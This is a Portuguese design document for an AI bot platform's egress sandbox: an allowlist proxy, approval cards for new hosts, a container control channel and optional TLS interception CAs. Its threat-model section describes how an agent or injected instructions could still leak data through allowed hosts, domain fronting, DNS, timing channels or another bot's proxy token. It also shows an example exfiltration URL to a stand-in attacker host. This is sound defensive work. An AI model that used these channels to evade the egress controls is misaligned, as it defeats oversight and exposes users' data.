# Rede dos bots: saída por proxy, com lista de hosts

Responde à pesquisa [fase-3-aprovacoes-cofre-conectores.md](pesquisas/fase-3-aprovacoes-cofre-conectores.md): o item **High** "shell com rede sem cartão" (a perna de saída do *lethal trifecta*) e o **High** "stdio no host". Aplica-se ao sandbox `docker`. No sandbox `local` não há isolamento nem proxy (só desenvolvimento).

## O que mudou

- **A máquina do bot não tem rede própria.** O contêiner roda numa rede Docker **interna** (`--internal`): sem rota para fora, sem DNS para fora. A única coisa alcançável é o endereço do host nessa rede, onde escuta o proxy.
- **O proxy fica fora da máquina dos bots** (no worker, ou num contêiner próprio: "Onde o proxy roda"). Só ele fala com a internet. Cada comando do bot (`docker exec`) já nasce com `HTTP_PROXY`/`HTTPS_PROXY` apontando para ele, então `curl`, `npm`, `pip`, `git` por https e o `web_fetch` passam por ele sem o bot fazer nada.
- **O proxy só deixa passar nomes de host da lista.** Comparação por **igualdade exata** do nome normalizado (minúsculas, sem o ponto final). Não há curinga, sufixo nem padrão: `api.exemplo.com` não libera `exemplo.com`, nem `x.api.exemplo.com`.
- **Endereços IP, `localhost` e o endereço de metadados são recusados sempre**, mesmo que alguém os ponha na lista (a lista nem aceita IP). Depois de resolver o nome, o endereço é conferido **numericamente** contra as faixas privadas, de loopback, link-local, metadados, multicast e reservadas (IPv4 e IPv6, inclusive IPv4 embutido em IPv6); se **qualquer** resposta cair numa dessas faixas, o nome é recusado. O proxy resolve **uma vez** e conecta ao endereço que validou (contra *DNS rebinding*).
- **Portas:** só 80 e 443 (configurável).
- **Sem segredo no ambiente do contêiner.** O contêiner nasce sem variável nenhuma além das da imagem. Os comandos recebem só as variáveis de proxy (veja "O que o bot enxerga").

## A lista

| De onde | O que é | Quem muda |
|---|---|---|
| Padrões globais | `sandbox.network.defaultHosts` na configuração. Padrão visível: `registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org` | o dono, na configuração |
| Por bot | `suup network allow <bot> <host>` / `PUT /v1/bots/:id/network/hosts/:host` | o usuário (ato explícito) |
| Só esta execução | o que um cartão aprovado cria (abaixo); deixa de valer quando a execução termina | o usuário, no cartão |
| Por conector | `egressHosts` do conector (`suup connectors add --egress`, `connectors set-egress`), somado aos padrões | o usuário |

Ver e mexer: `suup network list <bot>`, `suup network allow <bot> <host>`, `suup network rm <bot> <host>` (o bot é um argumento **posicional**, o nome ou o início do id; não existe `--bot` nestes comandos); na API `GET /v1/bots/:id/network` (padrões, hosts do bot, últimas recusas), `PUT` e `DELETE` em `/v1/bots/:id/network/hosts/:host`.

## Host novo: recusa, aviso e cartão

1. O bot roda `curl https://api.novo.com`. O proxy recusa (`403`) e **registra** a recusa (tabela `network_events`, visível em `suup network list <bot>` e na API). Toda resposta `403` do proxy (ao `CONNECT` e ao `GET http://`) leva o código da recusa no cabeçalho `X-Suup-Egress-Reason` (`not_allowed`, `ip_literal`, `bad_host`, `bad_port`, `dns_failed`, `forbidden_address`, `policy_unavailable`: `EGRESS_REFUSAL_REASONS` em `packages/sandbox/src/egress/types.ts`) e o texto em `X-Suup-Egress`; quem usa o proxy compara o código, nunca o texto (os motores diretos da busca dizem o motivo por ele: um nome que não resolve não vira "fora da lista").
2. O resultado da ferramenta mostra, no fim do `stderr`: `suup: network: host api.novo.com is not allowed for this bot. If the user agrees, ask for it with the request_network_access tool (host api.novo.com).`
3. O bot chama `request_network_access { host, reason }`. É uma chamada comum de ferramenta, de nível `external_irreversible`: **sempre vira cartão** (a execução fica em `waiting_approval`), com o host exato e o motivo. O usuário aprova ou recusa como em qualquer cartão.
4. Aprovado: o host fica liberado **para esta execução** (linha em `network_hosts` com `run_id`, que só vale enquanto a execução não terminou). O bot repete o comando.

**Permitir para sempre (para este bot) não é decisão de cartão:** pela regra do dono (docs/REGRAS.md, seção 3), uma regra permanente só nasce de um ato explícito do usuário, não de um cartão comum. Quem quer o host fixo usa `suup network allow` (ou a tela de rede, quando existir). Se o dono quiser o botão dividido "Permitir para este bot" neste cartão (como o de destinatário), é uma exceção a decidir; o ponto de encaixe é o mesmo da decisão `allowRecipient`.

## Modelo de ameaça, honestamente

O que isto **impede**: um comando (ou um pacote instalado, ou uma página que injetou instruções) falar com um servidor qualquer na internet; falar com a rede interna, o host ou o serviço de metadados; usar a rede sem passar pela lista; ver variáveis do servidor (não existem no contêiner).

O que isto **não impede**:

- **Um host liberado é um canal.** Qualquer coisa que o host aceite pode servir para tirar dado de lá: `registry.npmjs.org` e `pypi.org` aceitam publicar pacotes (com uma conta); `github.com`, se for liberado, aceita gists e commits; um serviço de colar texto é uma saída por definição. A lista reduz a superfície, não a elimina. Por isso o padrão é só os registros de pacotes e todo host novo exige cartão.
- **O proxy não olha dentro do HTTPS.** Ele vê o nome do host do `CONNECT`, não o conteúdo. Um cliente pode, dentro do túnel, pedir outro `Host`/SNI a um CDN que atende vários domínios (*domain fronting*): se o host liberado for um CDN compartilhado, o túnel chega ao CDN, não necessariamente ao site que se imaginava.
- **DNS:** o contêiner não resolve nomes sozinho (testado: `getent hosts` falha), então não há canal de DNS a partir dele. O **proxy** resolve os nomes **liberados** (e só depois de decidir): um nome liberado cujo servidor de nomes seja de um atacante vê a consulta. Nomes não liberados são recusados antes de qualquer consulta.
- **Canais de tempo e volume:** o bot pode codificar dado no *quando* e no *quanto* conversa com um host liberado. Não há limite de volume nem de taxa por host nesta versão.
- **Credencial do proxy no ambiente dos comandos.** Para saber de qual bot é cada conexão, cada comando recebe `HTTP_PROXY=http://bot.<id>:<token>@<proxy>`: o token só abre o proxy, com a lista **daquele bot**, e só é alcançável de dentro da rede interna. Não é um segredo do cofre (o teste de "sem segredo no ambiente" confere isso por nome e por valor), mas aparece em `env`.
- **Os bots compartilham uma máquina.** Todos os bots rodam no mesmo contêiner (um diretório por bot, mesmo usuário). A lista por bot é uma política, **não** uma fronteira entre bots: um bot malicioso que consiga ler o ambiente de outro processo ativo no mesmo contêiner pode usar o token dele. Isolar bots entre si (um contêiner por bot) é trabalho futuro.
- **IPv6 e portas fora de 80/443** não passam; protocolos que não são HTTP(S) (ssh, git://, bancos) não funcionam, de propósito.

## Onde o proxy roda (e por quê)

Há **dois modos**, escolhidos por `sandbox.network.proxy.mode`. Em ambos, quem decide a política (a lista, as aprovações, o banco) é o **worker**; o código que decide por host (`decideHost`, a conferência numérica de endereços, resolver uma vez) é o mesmo.

### `process` (padrão): dentro do worker

Um servidor `node:http` pequeno no processo do worker, escutando no endereço do host na rede interna (o *gateway* da ponte). Serve onde o worker enxerga esse endereço: um Linux com o Docker no próprio host, ou o worker dentro de um contêiner na rede interna (Compose de produção, veja `docs/IMPLANTACAO.md`). Não há contêiner a mais; a lista vem direto do banco. Cada processo (worker, CLI) abre o seu proxy numa porta livre. **Produção continua assim**: é o caminho que já está provado e o mais simples ali.

### `container`: o proxy no contêiner `suup-egress` (o app no Windows e no macOS)

No **Docker Desktop** as redes do Docker vivem dentro de uma máquina virtual: o endereço do *gateway* não existe para um processo do Windows (o servidor do app), que não consegue escutar lá. Por isso o proxy roda **dentro** da VM, num contêiner:

```
 Windows (ou macOS)                       Docker (VM do Docker Desktop)
 ┌────────────────────┐   127.0.0.1:N     ┌───────────────────────────────────────────┐
 │ servidor + worker  │ ───────────────►  │ suup-egress  (imagem suup-egress)         │
 │ (processo do host) │  canal de controle│   controle :3129  só na rede comum        │
 │ lista, aprovações, │ ◄───────────────  │   proxy    :3128  só na rede interna      │
 │ banco, eventos     │  lista? / eventos │        │ rede comum (bridge) ──► internet │
 └────────────────────┘                   │        │ rede interna (--internal)        │
                                          │  máquina dos bots, conectores ──► :3128   │
                                          └───────────────────────────────────────────┘
```

- **Redes.** O contêiner entra na rede **interna** dos bots (`sandbox.network.name`, onde os bots e os conectores o alcançam) e numa rede **comum** `<nome>-out` (por onde ele alcança a internet). A máquina dos bots e os conectores seguem só na interna: sem rota, sem DNS para fora. O proxy escuta **só** no endereço que tem na rede interna; a porta de controle escuta **só** no endereço da rede comum, então os bots nem a enxergam (o teste confere).
- **Canal de controle.** O contêiner **publica** a porta 3129 **somente em `127.0.0.1`** do computador (o Docker Desktop encaminha portas publicadas até o Windows; veja a pesquisa). O **worker abre** uma conexão TCP até essa porta (uma saída do worker: nada precisa entrar no Windows). Uma linha de JSON por mensagem: o worker manda `hello` com o token; o proxy responde `ready`; daí em diante o proxy **pergunta** ao worker a lista de hosts do sujeito (`hosts?`) a cada conexão de um bot e **informa** cada decisão (`event`); a recusa só é respondida ao bot depois que o worker confirmou (`ack`), então o aviso no resultado da ferramenta e a linha em `network_events` continuam exatos. A lista nunca fica copiada no proxy: uma aprovação de `request_network_access` vale na próxima conexão.
- **Autenticação.** A cada início o worker gera **dois valores aleatórios** (256 bits cada): o token do canal e a chave das credenciais dos sujeitos. Chegam ao contêiner por variável de ambiente (pelo ambiente do cliente `docker`, nunca na linha de comando) e **não aparecem em nenhum registro** (o teste confere). Uma conexão com token errado é fechada sem resposta; sem `hello` em 5 s também. Um novo worker (reinício) toma o lugar do antigo.
- **Sem worker conectado**, o proxy **recusa tudo** (`policy_unavailable`: "a lista não está disponível agora") e guarda os eventos numa fila limitada (500) que entrega ao próximo worker. Uma pergunta sem resposta em 5 s também é recusa. O proxy nunca libera nada por conta própria.
- **Um dono.** O contêiner tem nome fixo (`suup-egress`); quem começa o substitui (e as credenciais antigas, feitas com a chave antiga, deixam de valer). Só o processo do app usa este modo; ao parar, ele remove o contêiner.
- **Rede interna com tráfego entre contêineres ligado.** A máquina dos bots precisa alcançar o proxy pela ponte, então neste modo a rede é criada **sem** `enable_icc=false`. Custo: a máquina dos bots e os contêineres dos conectores (todos na mesma rede) podem falar entre si. A máquina só tem `sleep` e os comandos dos bots; um conector stdio não escuta porta; mas um bot que abra um servidor na máquina o expõe a um conector. Não há isolamento entre eles por rede neste modo (continua sem haver entre bots). Se a rede já existia com a opção antiga e **vazia**, é recriada; com contêineres nela, o app diz o que fazer.
- **O contêiner do proxy** roda sem capacidades, sem novos privilégios, com o sistema de arquivos só de leitura, usuário não root, 256 MB e limite de processos. Não tem banco, lista nem segredo do cofre.
- **Imagem.** `docker/egress/Dockerfile` leva um único arquivo JavaScript, `egress.mjs`, gerado por `node apps/sidecar/scripts/egress-image.mjs docker/egress` (depois de `pnpm exec tsc -b`; o arquivo não vai ao repositório). O app já leva os dois e constrói `suup-egress:app-<versão>` na primeira vez, no mesmo passo "Preparando a máquina dos bots…".
- **Configuração:** `"network": { "proxy": { "mode": "container", "image": "suup-egress:dev" } }`. O app de desktop grava isso sozinho depois de provar o caminho (abre um contêiner descartável e fala com ele pela porta publicada); se não der, tenta o modo `process`; se também não der, cai em "sem isolamento" com o motivo (`gateway_unreachable`).

Os conectores stdio em contêiner (`ContainerStdioLauncher`) usam o mesmo serviço (`EgressService`) nos dois modos: as variáveis de proxy dos comandos e dos conectores apontam para o mesmo proxy.

### Por que não o contrário (o contêiner chamar o host)

`host.docker.internal` leva do contêiner até o host, mas exigiria que o worker escutasse uma porta alcançável **de dentro da rede dos bots** (os bots a alcançariam) e que o firewall do Windows deixasse. O canal por porta publicada em `127.0.0.1` só aceita quem está no próprio computador.

## O que o bot enxerga

`env` dentro do contêiner mostra `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY` (e as minúsculas) com a credencial do proxy, `NO_PROXY` vazio, e as variáveis da imagem (`HOME`, `PATH`, `LANG`...). Nada do servidor: nem `DATABASE_URL`, nem a chave do cofre, nem o token do servidor.

## A leitura de páginas e a busca não passam pela lista do bot

[BUSCA.md](BUSCA.md) descreve `web_search` e `web_read`. Duas exceções **explícitas** a "a saída é só pela lista do bot", ambas decididas pelo dono:

- **`web_read` vai pelo serviço leitor, não pela lista do bot.** O leitor é um contêiner à parte (ou o próprio worker, sem Docker) que baixa **páginas públicas** por nome de host, **sem cartão**: só GET, sem cookies, sem segredo do usuário, só portas 80 e 443, e recusa IP literal e qualquer nome que resolva (depois do DNS, resolvido uma vez) para faixa privada, de loopback, link-local, de metadados ou reservada; cada redirecionamento é conferido de novo. O universo de sites é aberto (cada página puxa recursos de terceiros), por isso a lista de nomes exatos não cabe nele. **A máquina do bot continua só com a lista** e com os cartões; o leitor não lhe dá saída nenhuma. O dono pode desligar o leitor (`web.reader.enabled: false`): então `web_read` lê pela máquina do bot, **pela lista e com cartões**.
- **A busca sai por dois proxies próprios, ambos com lista fixa de hosts exatos.** (1) O SearXNG (só o DuckDuckGo) vive numa rede interna e só sai por um proxy do worker (a mesma classe `EgressProxy`) com os hosts exatos dos motores dele; no app do Windows esse proxy roda no contêiner `suup-egress-search`, do mesmo jeito que o `suup-egress` dos bots (canal de controle por porta publicada em `127.0.0.1`), e o SearXNG se identifica com a credencial desta partida, que só abre a lista dos motores ([BUSCA.md](BUSCA.md), "O app embutido"). (2) Os motores que o **Suup mesmo pergunta** (Wikipédia, arXiv, Stack Overflow, com o `User-Agent` honesto) saem por um segundo `EgressProxy` do worker que escuta **só em `127.0.0.1`** (porta efêmera, sem Docker) e deixa passar os hosts exatos dos motores diretos ligados; o cliente (`createDirectGet`) faz `CONNECT host:443` e fala TLS até o serviço. Nenhum dos dois toca a lista dos bots.

O proxy ganhou dois modos para isso (`packages/sandbox/src/egress/proxy.ts`, com testes): `openWeb` (qualquer **nome** público; o resto da regra continua: sem IP literal, só as portas, endereço resolvido público e conexão ao endereço validado) para o navegador do renderizador, e `anonymousSubject` (sem credencial, lista fixa) para o proxy de motores. Os bots nunca usam nenhum dos dois.

**O que isto abre, e o que fecha:** a URL lida é um canal de saída (`https://atacante.exemplo/?dado=...`). Por decisão do dono, `web_read` só abre **sem cartão** um endereço que já apareceu na execução (mensagem do usuário, resultado de busca, link de uma página lida; igualdade exata do endereço normalizado); qualquer outro é um cartão "Ler uma página nova: `<url>`" ([APROVACOES.md](APROVACOES.md), [BUSCA.md](BUSCA.md)).

**Hosts de saída da busca.** Proxy do SearXNG: a união dos hosts **exatos** dos motores `searxng` ligados (`engineHosts`, em `packages/web/src/engines.ts`, lidos no módulo de cada motor da imagem fixada). Com `duckduckgo` ligado entra **`html.duckduckgo.com`** e só ele (o módulo faz POST só aí; `duckduckgo.com` é usado apenas por uma função de manutenção offline e por outros motores, desligados). Proxy dos motores diretos: **`<idioma>.wikipedia.org`** para cada idioma de `web.search.languages` (padrão `en.wikipedia.org` e `pt.wikipedia.org`), **`export.arxiv.org`** e **`api.stackexchange.com`**, e nada mais (o teste usa o proxy real e confere a recusa de qualquer outro nome). **`api.github.com` não está em lista nenhuma:** a busca no GitHub é do conector MCP ([CONECTORES.md](CONECTORES.md)), não da busca na web. Google e Bing não existem na lista. **O Suup não burla proteção de site** (sem captcha resolvido, sem rodízio de IP ou de `User-Agent`): BUSCA.md, "Regra do dono".

## Conectores stdio

Veja [CONECTORES.md](CONECTORES.md). Com o sandbox `docker`, cada conector stdio roda **num contêiner próprio**, na mesma rede interna, e sai pelo mesmo proxy com a lista **dos padrões + `egressHosts` do conector**. Conector novo que precisa de um host: `suup connectors set-egress <nome> --host api.exemplo.com`. Não há cartão para conector (não há execução para pausar): a recusa fica registrada em `network_events` (sujeito `connector`) e o servidor costuma dizê-la no erro da chamada; ainda não há comando nem tela que liste as recusas de um conector (adiado). Quem libera é o usuário.

## `suup doctor`

Com o sandbox docker o `doctor` confere, **de dentro do contêiner**: (1) que um endereço público sem o proxy (`curl --noproxy '*' http://1.1.1.1/`) **não** responde; (2) que o proxy recusa um host que não está na lista. Falha no primeiro é "PERIGO": a máquina tem saída direta (por exemplo, um contêiner criado antes desta versão; o runtime o recria sozinho ao subir, mantendo o volume). Com o sandbox `local` ele diz que não há proxy. Para cada conector stdio diz **onde ele roda**: em contêiner (isolado) ou no host, sem isolamento.

## Configuração

```json
"sandbox": {
  "kind": "docker",
  "image": "suup-sandbox:dev", "name": "suup-machine", "volume": "suup-workspace",
  "network": {
    "name": "suup-sandbox-net",
    "defaultHosts": ["registry.npmjs.org", "pypi.org", "files.pythonhosted.org"],
    "ports": [80, 443],
    "proxy": { "listenHost": "172.29.77.2", "advertiseHost": "172.29.77.2", "port": 3128 }
  },
  "connectors": { "image": "suup-connector-runner:dev", "memory": "512m", "cpus": 1 }
}
```

Tudo é opcional; sem `network` valem os padrões acima. `defaultHosts: []` não libera nada por padrão. `proxy` só se muda quando o worker não roda no host (veja IMPLANTACAO.md).

## Rede com interceptação de TLS (CA extra, opcional)

Alguns proxies (corporativos, ou o ambiente de um agente) **reassinam o HTTPS** com uma CA própria. O host está na lista e o túnel abre, mas dentro do contêiner o TLS falha ("self-signed certificate in certificate chain"), porque a CA do proxy não está na imagem. Isto **não** se resolve gravando uma CA na imagem (nenhuma CA entra em nenhuma imagem do projeto). Resolve-se por configuração, **desligada por padrão**:

```json
"sandbox": { "kind": "docker", "...": "...", "extraCaBundle": "/etc/ssl/certs/ca-da-empresa.pem" }
```

- `extraCaBundle` é o caminho **absoluto**, no computador do worker, de um arquivo PEM. Sem o campo, nada é montado e nenhuma variável é definida.
- Com ele, a máquina dos bots **e** cada contêiner de conector recebem o arquivo **somente leitura** em `/etc/suup/extra-ca.pem` (`--mount ...,readonly`: o bot não consegue alterá-lo) e as variáveis `NODE_EXTRA_CA_CERTS`, `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `REQUESTS_CA_BUNDLE` e `GIT_SSL_CAINFO` apontando para ele. Uma variável que o próprio conector declara vale mais que estas.
- **Cuidado:** `NODE_EXTRA_CA_CERTS` **soma** à lista do sistema, mas as outras quatro **substituem** a lista daquele programa. Numa rede em que todo HTTPS é reassinado, a CA do proxy basta; para manter também as do sistema, coloque as duas no mesmo arquivo (a CA do proxy mais o conteúdo de `/etc/ssl/certs/ca-certificates.crt`).
- A CA só **confia**: não libera nenhum host. A lista de hosts continua sendo a única coisa que decide o que é alcançável, e a confiança numa CA de interceptação significa que o proxy dessa rede pode ler o tráfego dos bots. Use só onde isso já é assim.
- Mudar o valor (ou tirá-lo) **recria a máquina** dos bots na próxima execução (o volume do workspace é mantido; o rótulo `suup.extra-ca` do contêiner guarda o caminho usado). O arquivo é montado, não copiado: trocar o conteúdo vale na hora.
- Caminho que não existe, não é arquivo ou tem vírgula: o runtime recusa ao preparar a máquina, com a mensagem dizendo qual.
- Teste: `packages/sandbox/test/extra-ca.test.ts` (a parte de Docker roda com `SUUP_DOCKER_TESTS=1 SUUP_SANDBOX_IMAGE=... SUUP_CONNECTOR_IMAGE=...`).

## O que o app de desktop vai precisar

O app desenha (seção "Rede" na edição do bot, `runsIn` e hosts dos conectores, o cartão de acesso à rede): veja a seção "Rede dos bots" de [FRONTEND.md](FRONTEND.md) e [DESIGN.md](DESIGN.md) §3b. O servidor não declara se o sandbox é o local; o app deduz pela ferramenta `request_network_access` em `GET /v1/tools`.

## Não verificado / adiado

- O modo `container` foi provado com Docker real em **Linux**, com o worker como processo do host falando só pela porta publicada em `127.0.0.1` (`packages/sandbox/test/egress-container.test.ts`, `packages/runtime/test/connector-egress-container.test.ts`, `apps/sidecar/test/embedded.test.ts`). **Não foi exercitado no Windows com Docker Desktop** (porta publicada, firewall, WSL 2 contra Hyper-V); veja a pesquisa, "Adendo: proxy em contêiner".
- O caminho de produção com o worker em contêiner (Compose, IP fixo na rede interna) foi escrito e validado só com `docker compose config`; a ponta a ponta com Docker dentro de Docker não foi exercida.
- Limite de volume/taxa por host, um contêiner por bot, e inspeção de SNI/Host dentro do túnel não existem.
- O botão "Permitir para este bot" no cartão (decisão do dono).
